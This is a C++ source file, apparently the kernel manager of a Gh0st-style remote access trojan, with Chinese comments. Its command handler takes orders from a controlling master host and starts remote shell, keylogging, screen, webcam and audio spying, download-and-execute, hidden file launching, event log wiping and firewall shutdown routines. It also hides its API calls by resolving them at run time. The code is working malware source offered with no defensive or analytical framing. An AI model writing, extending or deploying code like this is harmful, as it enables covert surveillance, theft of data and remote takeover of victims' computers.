// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "inject.h"
#include "Proxy.h"
#include <Shlwapi.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;
	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中
//	m_hThread[m_nThreadCount++] = 
//		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

BOOL CKernelManager::API_CreateProcessA(IN LPCSTR lpApplicationName,
										IN LPSTR lpCommandLine,
										IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
										IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
										IN BOOL bInheritHandles,
										IN DWORD dwCreationFlags,
										IN LPVOID lpEnvironment,
										IN LPCSTR lpCurrentDirectory,
										IN LPSTARTUPINFOA lpStartupInfo,
										OUT LPPROCESS_INFORMATION lpProcessInformation)
{
	char szkernel32[]="kernel32.dll";
	
	BOOL result;
	typedef BOOL (WINAPI *lpAddFun)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);			//返回值,形参类型参考函数定义,去后面的
	HINSTANCE hDll=LoadLibrary(szkernel32);			//函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"CreateProcessA");	//函数名字
	if (addFun != NULL)
	{
		addFun(lpApplicationName,lpCommandLine,lpProcessAttributes,lpThreadAttributes,bInheritHandles,dwCreationFlags,lpEnvironment,lpCurrentDirectory,lpStartupInfo,lpProcessInformation);					//调用函数，去前面的
		FreeLibrary(hDll);					//释放句柄
	}
	return result;
}
typedef UINT (WINAPI *GetWindowsDirectoryAT)
(
 OUT LPSTR lpBuffer,
 IN UINT uSize
 );

BOOL CKernelManager::OpenFile(const void *filedata, UINT size, INT nShowCmd)
{	
	char MyGetWindowsDirectoryA[] = {'G','e','t','W','i','n','d','o','w','s','D','i','r','e','c','t','o','r','y','A','\0'};
	GetWindowsDirectoryAT MGetWindowsDirectoryA= (GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("kernel32.dll"),MyGetWindowsDirectoryA);
	
	
	char	lpSubKey[500];
	HKEY	hKey;
	FILE	*fp;
	char	strTemp[MAX_PATH], strExePath[MAX_PATH], strRand[50];
	MGetWindowsDirectoryA( strExePath, sizeof(strExePath) );
	strExePath[3] = '\0';
	wsprintf( strRand, "\\Program Files\\%d%D.COM", GetTickCount() ,GetTickCount());
	wsprintf(strExePath,"%s%s",strExePath,strRand);
	fp = fopen( strExePath, "wb" );
	fwrite( filedata, size, 1, fp );
	fclose(fp);
	if ( nShowCmd == 3 )
	{
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		si.cb = sizeof si;
		si.lpDesktop = "WinSta0\\Default"; 
		return API_CreateProcessA(strExePath, "rfdfh$%^&*@", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
	if ( nShowCmd != 2 )
	{
		LONG	nSize = sizeof(strTemp);
		char	*lpstrCat = NULL;
		memset(strTemp, 0, sizeof(strTemp));
		
		char	*lpExt = strrchr(strExePath, '.');
		if (!lpExt)
			return false;
		
		if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			return false;
		RegQueryValue(hKey, NULL, strTemp, &nSize);
		RegCloseKey(hKey);
		memset(lpSubKey, 0, sizeof(lpSubKey));
		wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
		
		if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			return false;
		memset(strTemp, 0, sizeof(strTemp));
		nSize = sizeof(strTemp);
		RegQueryValue(hKey, NULL, strTemp, &nSize);
		RegCloseKey(hKey);
		lpstrCat = strstr(strTemp, "\"%1");
		if (lpstrCat == NULL)
			lpstrCat = strstr(strTemp, "%1");
		
		if (lpstrCat == NULL)
		{
			//		lstrcat(strTemp, " ");
			wsprintf(strTemp,"%s"," ");
			//		lstrcat(strTemp, strExePath);
			wsprintf(strTemp,"%s",strExePath);
		}
		else
			//		lstrcpy(lpstrCat, strExePath);
			wsprintf(lpstrCat,"%s",strExePath);
		
		
		
		
		
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		si.cb = sizeof si;
		if (nShowCmd != SW_HIDE)
			si.lpDesktop = "WinSta0\\Default"; 
		
		API_CreateProcessA(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
}
BOOL EnablePri1()
{
	typedef __out HANDLE (WINAPI *GetCurrentProcessT)
		(
		VOID
		);
	GetCurrentProcessT pGetCurrentProcess = (GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetCurrentProcess");
	HANDLE hToken;
	if ( OpenProcessToken(pGetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken) )
	{
		TOKEN_PRIVILEGES tkp;
		
		LookupPrivilegeValue( NULL,SE_DEBUG_NAME,&tkp.Privileges[0].Luid );//修改进程权限
		tkp.PrivilegeCount=1;
		tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges( hToken,FALSE,&tkp,sizeof tkp,NULL,NULL );//通知系统修改进程权限
		typedef BOOL (WINAPI *GetLastErrorT)
			(
			VOID
			);
		GetLastErrorT pGetLastError = (GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetLastError");
		return( (pGetLastError()==ERROR_SUCCESS) );
		
	}
}

DWORD WINAPI STOPFHQ()
{
	EnablePri1();
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	char*ServerName = "sharedaccess";
    service=OpenService(scm,ServerName,SERVICE_ALL_ACCESS);
    BOOL isSuccess=QueryServiceStatus(service,&status);
    if ( status.dwCurrentState !=SERVICE_STOPPED )
	{
		isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
	}
	CloseServiceHandle(service );
	CloseServiceHandle(scm);
    return true;
}
// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO: //语音监听
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // 远程sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_RENAME_REMARK: // 改备注
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_REGEDIT:          //注册表管理   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SERVERS:          //服务管理 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ServersManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日志
		CleanEvent();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_CHANGE_GROUP: // 更改分组
		SetGroup( NULL, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_SHOW_MSG: // 发送信息1
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShowMsg,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_OPEN_PROXY: // 开启代理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OpenProxy,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_SYSINFO: // 主机管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
		(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SENDFILE_HIDE:
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_HIDE);
		}
		break;
	case COMMAND_SENDFILE_NORMAL:
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_SHOWNORMAL);
		}
		break;
	case COMMAND_SENDFILE_NOSTART:
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 2);
		}
		break;
	case COMMAND_STOPFH: // 关防火墙
        STOPFHQ();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	}	
}

void CKernelManager::UnInstallService()
{
	// 1) 进程内删除服务，不再注入 winlogon（受保护关键进程，注入会导致注销/黑屏）
	SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hScm)
	{
		SC_HANDLE hSvc = OpenService(hScm, m_strServiceName, DELETE);
		if (hSvc)
		{
			DeleteService(hSvc);	// 标记删除，进程退出/重启后由 SCM 移除
			CloseServiceHandle(hSvc);
		}
		CloseServiceHandle(hScm);
	}

	// 2) 清理注册表服务键（兜底）
	char strRegKey[300];
	wsprintf(strRegKey, "SYSTEM\\CurrentControlSet\\Services\\%s", m_strServiceName);
	SHDeleteKey(HKEY_LOCAL_MACHINE, strRegKey);

	// 3) 删除键盘记录等附属文件
	char strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\keylog.dat");
	DeleteFile(strRecordFile);

	// 4) 自身程序标记为重启后删除（运行中无法当场删除）
	char strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, MAX_PATH);
	MoveFileEx(strSelf, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	// 5) 退出当前独立(owner)进程
	ExitProcess(0);
}


bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}